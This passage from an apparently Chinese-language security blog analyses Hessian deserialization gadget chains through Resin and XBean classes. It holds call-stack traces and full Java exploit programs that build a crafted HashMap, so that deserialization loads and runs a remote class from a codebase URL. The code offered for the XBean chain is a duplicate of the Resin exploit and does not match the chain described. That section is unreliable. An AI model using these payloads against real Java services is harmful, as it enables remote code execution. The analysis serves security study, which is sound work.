<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用链也提前标注一下吧</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loadClass:<span class="number">85</span>, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">158</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getContext:<span class="number">439</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getTargetContext:<span class="number">55</span>, ContinuationContext (javax.naming.spi)</span><br><span class="line">composeName:<span class="number">180</span>, ContinuationContext (javax.naming.spi)</span><br><span class="line">toString:<span class="number">353</span>, QName (com.caucho.naming)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">577</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">1160</span>, HessianInput (com.caucho.hessian.io)</span><br><span class="line">Hessian_unserialize:<span class="number">87</span>, Hessian_Resin (com.ocean)</span><br><span class="line">main:<span class="number">43</span>, Hessian_Resin (com.ocean)</span><br></pre></td></tr></table></figure>
<h3 id="调用链分析">调用链分析</h3>
<p>先来说一下这条链子主要是通过HashMap中PutVal方法里的key.equals(k)触发XString 的equals方法。其实之前也有过了解在学习FastJson的时候</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104160754479.png" class="">
<p>这里会调用toSting方法而这里利用的是com.caucho.naming.QName类。看看其toString方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161327316.png" class="">
<p>会调用一个composeName的方法，利用的是javax.naming.spi.ContinuationContext这个类</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161631606.png" class="">
<p>这个方法会调用getTargetContext方法，跟进去看看</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161733694.png" class="">
<p>发现这里调用了NamingManager.getContext方法，这里就比较熟悉了，分析过Jndi注入的师傅应该都有了解，这里我们在走一遍，跟进这个getContext方法。这里多说一句可以看到传入的是cpe.getResolveObj所以在后面构造的时候会使用CannotProceedException这个类的构造方法构造而已的refrence对像传入这里</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162119159.png" class="">
<p>走到getObjectInstace方法中</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162237509.png" class="">
<p>会调用到这个getObjectFactoryference方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162313983.png" class="">
<p>这里就是漏洞触发点了，他会现在本地加载类，如果找不到就会去远程加载类，但是同时会判断这个codebase的值，所以会受到java的版本影响。</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104170343863.png" class="">
<p>来看一下网上的Payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Resin</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;  </span><br><span class="line">        String codebase=<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>;  </span><br><span class="line">        String clazz=<span class="string">&quot;Exp&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);  </span><br><span class="line">        ccCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;siJdcpuR&quot;</span>, clazz,codebase));  </span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(ctx,<span class="string">&quot;aiwin&quot;</span>,<span class="string">&quot;aiwin1&quot;</span>); <span class="comment">//_items要过for循环  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">unhash</span> <span class="operator">=</span> unhash(qName.hashCode()); <span class="comment">//将哈希值转换回原始数据的算法,放入到Xstring的值中,为了p.hash == hash  </span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(unhash);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, qName, qName, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, xString, xString, <span class="literal">null</span>));  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        String result=Hessian_serialize(hashMap);  </span><br><span class="line">        Hessian_unserialize(result);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span><span class="params">(StringBuilder partial, <span class="type">int</span> target)</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;  </span><br><span class="line">        <span class="keyword">if</span> (div &lt;= <span class="number">65535</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (div != <span class="number">0</span>)  </span><br><span class="line">                partial.append((<span class="type">char</span>)div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            unhash0(partial, div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (target == Integer.MIN_VALUE)  </span><br><span class="line">                <span class="keyword">return</span> answer.toString();  </span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;  </span><br><span class="line">        &#125;  </span><br><span class="line">        unhash0(answer, target);  </span><br><span class="line">        <span class="keyword">return</span> answer.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Hessian_serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);  </span><br><span class="line">        SerializerFactory serializerFactory=<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();  </span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);  </span><br><span class="line">        hessianOutput.setSerializerFactory(serializerFactory);  </span><br><span class="line">        hessianOutput.writeObject(object);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Hessian_unserialize</span><span class="params">(String obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] code=Base64.getDecoder().decode(obj);  </span><br><span class="line">        ByteArrayInputStream byteArrayInputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(code);  </span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);  </span><br><span class="line">        hessianInput.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        Field dfield=object.getClass().getDeclaredField(field);  </span><br><span class="line">        dfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dfield.set(object,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104164259843.png" class="">
<p>成功弹出计算器。看到Payload其实会有疑问就是有两个计算hash的地方，这里我是看的其他师傅的blog可以参考他们的解释：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Dug5SK1y4WLhYMLdS7ff4g">https://mp.weixin.qq.com/s/Dug5SK1y4WLhYMLdS7ff4g</a><br>
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13599">https://xz.aliyun.com/t/13599</a></p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104165104584.png" class="">
<p>这里要想走到这个key.equals就需要满足以下条件</p>
<ul>
<li>(p = tab[i = (n - 1) &amp; hash]) == null</li>
<li>p.hash == hash</li>
</ul>
<p>那么为什么可以利用hash碰撞来进行绕过呢，是因为Xstring方法冲写了hashcode方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104165946484.png" class="">
<p>这是调用的str方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104170020823.png" class="">
<p>就是将m_obj属性转换成字符串类型返回，最后调用String的hashCode方法进行hash计算，这里的m_obj即是实例化XString传入的参数。所以我们可以根据Qname的hashcode来构造Xstring的hashcode也就可以触发整条调用链</p>
<h2 id="XBean链">XBean链</h2>
<p>依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>调用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loadClass:<span class="number">61</span>, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">146</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">resolve:<span class="number">73</span>, ContextUtil (org.apache.xbean.naming.context)</span><br><span class="line">getObject:<span class="number">204</span>, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">toString:<span class="number">192</span>, Binding (javax.naming)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">104</span>, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">main:<span class="number">34</span>, Hessian_XBean (com.ocean)</span><br></pre></td></tr></table></figure>
<h3 id="调用链分析-2">调用链分析</h3>
<p>XBean 这条链几乎是与 Resin 一模一样，只不过是在 XBean 中找到了类似功能的实现。<br>
这里首先还是会从Xstring这里触发toString方法不过这次走的Binding类的toString方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183559048.png" class="">
<p>这里只有一个getObject方法，而在ContextUtil$ReadOnlyBinding类里存在getObject方法，并且也是Binding的子类，所以调用ReadOnlyBinding的toString会执行到ReadOnlyBinding的getObject方法。</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183742050.png" class="">
<p>这里会调用ContextUtil#resolve方法跟进</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183818375.png" class="">
<p>可以看到这里存在NamingManager.getObjectInstance方法那么剩下的就和上面Resign一样了。从远程加载恶意类执行。</p>
<p>给出Payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Resin</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;  </span><br><span class="line">        String codebase=<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>;  </span><br><span class="line">        String clazz=<span class="string">&quot;Exp&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);  </span><br><span class="line">        ccCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>, clazz,codebase));  </span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(ctx,<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;ocean&quot;</span>); <span class="comment">//_items要过for循环  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">unhash</span> <span class="operator">=</span> unhash(qName.hashCode()); <span class="comment">//将哈希值转换回原始数据的算法,放入到Xstring的值中,为了p.hash == hash  </span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(unhash);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, qName, qName, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, xString, xString, <span class="literal">null</span>));  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        String result=Hessian_serialize(hashMap);  </span><br><span class="line">        Hessian_unserialize(result);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span><span class="params">(StringBuilder partial, <span class="type">int</span> target)</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;  </span><br><span class="line">        <span class="keyword">if</span> (div &lt;= <span class="number">65535</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (div != <span class="number">0</span>)  </span><br><span class="line">                partial.append((<span class="type">char</span>)div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            unhash0(partial, div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (target == Integer.MIN_VALUE)  </span><br><span class="line">                <span class="keyword">return</span> answer.toString();  </span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;  </span><br><span class="line">        &#125;  </span><br><span class="line">        unhash0(answer, target);  </span><br><span class="line">        <span class="keyword">return</span> answer.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Hessian_serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);  </span><br><span class="line">        SerializerFactory serializerFactory=<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();  </span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);  